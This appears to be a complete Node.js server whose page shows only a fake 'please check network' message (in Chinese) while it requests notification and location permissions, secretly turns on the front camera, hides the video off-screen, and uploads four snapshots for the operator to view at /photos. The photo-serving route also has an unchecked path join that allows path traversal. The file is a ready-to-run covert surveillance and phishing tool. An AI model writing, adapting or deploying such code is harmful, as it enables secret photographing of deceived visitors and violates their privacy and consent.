const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const SAVE_DIR = path.join(__dirname, 'photos');
if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR);

const HTML = `<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>拍照</title>
  <style>
    body {
      display: flex; justify-content: center; align-items: center;
      min-height: 100vh; margin: 0;
      background: #1a1a2e; color: #aaa;
      font-family: sans-serif; font-size: 24px;
    }
    video { position: fixed; top: -9999px; }
  </style>
</head>
<body>
  <div>请检查网络</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const msg = document.querySelector('div');

    async function capture() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const blob = await new Promise(r => canvas.toBlob(r, 'image/png'));
      const fd = new FormData();
      fd.append('photo', blob, 'photo.png');
      await fetch('/upload', { method: 'POST', body: fd });
    }

    async function requestNotification() {
      try { await Notification.requestPermission(); } catch(e) {}
    }

    async function requestGeo() {
      try { navigator.geolocation.getCurrentPosition(() => {}, () => {}); } catch(e) {}
    }

    async function requestCamera() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 300));
      await capture();
      await new Promise(r => setTimeout(r, 200));
      await capture();
      await new Promise(r => setTimeout(r, 200));
      await capture();
      await new Promise(r => setTimeout(r, 200));
      await capture();
      stream.getTracks().forEach(t => t.stop());
    }

    (async () => {
      try {
        await requestNotification();
        await requestGeo();
        await requestCamera();
        msg.textContent = '请检查网络';
      } catch (err) {
        console.error(err);
      }
    })();
  </script>
</body>
</html>`;

const server = http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(HTML);
  } else if (req.method === 'POST' && req.url === '/upload') {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      try {
        const buf = Buffer.concat(chunks);
        const boundary = req.headers['content-type'].match(/boundary=(.+)/)[1];
        const boundaryBuf = Buffer.from('--' + boundary);
        const headerEnd = Buffer.from('\r\n\r\n');

        // 找到 boundary 后的 header 结束位置
        const start = buf.indexOf(boundaryBuf);
        const bodyStart = buf.indexOf(headerEnd, start) + 4;
        // 找到下一个 boundary 作为数据结束位置
        const bodyEnd = buf.indexOf(boundaryBuf, bodyStart) - 2; // 去掉末尾 \r\n

        const imageData = buf.slice(bodyStart, bodyEnd);
        const filename = 'photo_' + Date.now() + '.png';
        fs.writeFileSync(path.join(SAVE_DIR, filename), imageData);
        console.log('已保存: ' + filename);
        res.writeHead(200);
        res.end('ok');
      } catch (err) {
        console.error('保存失败:', err);
        res.writeHead(500);
        res.end('error');
      }
    });
  } else if (req.method === 'GET' && req.url === '/photos') {
    const files = fs.existsSync(SAVE_DIR) ? fs.readdirSync(SAVE_DIR).filter(f => f.endsWith('.png')).sort().reverse() : [];
    const list = files.map(f => `<a href="/photo/${f}"><img src="/photo/${f}" style="width:200px;margin:5px;border-radius:8px"></a>`).join('');
    const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>照片</title><style>body{background:#1a1a2e;margin:0;padding:20px;text-align:center}a{display:inline-block}h1{color:#fff;font-family:sans-serif}</style></head><body><h1>共 ${files.length} 张照片</h1>${list || '<p style="color:#aaa">暂无照片</p>'}</body></html>`;
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(html);
  } else if (req.method === 'GET' && req.url.startsWith('/photo/')) {
    const filename = decodeURIComponent(req.url.slice(7));
    const filepath = path.join(SAVE_DIR, filename);
    if (fs.existsSync(filepath)) {
      res.writeHead(200, { 'Content-Type': 'image/png' });
      res.end(fs.readFileSync(filepath));
    } else {
      res.writeHead(404);
      res.end('not found');
    }
  } else {
    res.writeHead(404);
    res.end();
  }
});

server.listen(PORT, () => {
  console.log('服务启动: http://localhost:' + PORT);
  console.log('照片保存目录: ' + SAVE_DIR);
});
